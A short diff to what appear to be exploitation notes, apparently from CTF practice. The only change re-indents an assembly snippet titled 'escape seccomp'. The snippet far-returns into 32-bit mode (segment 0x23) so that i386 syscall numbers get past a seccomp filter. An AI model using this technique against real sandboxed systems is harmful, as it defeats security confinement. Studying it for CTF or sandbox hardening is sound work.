@@ -23,9 +23,9 @@ you can open a file and pass to the fd you want like this
 # escape seccomp
 exchange from amd64 into i386 to use difference number of SYS_No of syscalls
 ```console
-    xor rsp, rsp
-    mov esp, 0x1337800
-    mov DWORD PTR [esp+4], 0x23
-    mov DWORD PTR [esp], 0x1337080
-    retf
+xor rsp, rsp
+mov esp, 0x1337800
+mov DWORD PTR [esp+4], 0x23
+mov DWORD PTR [esp], 0x1337080
+retf
 ```
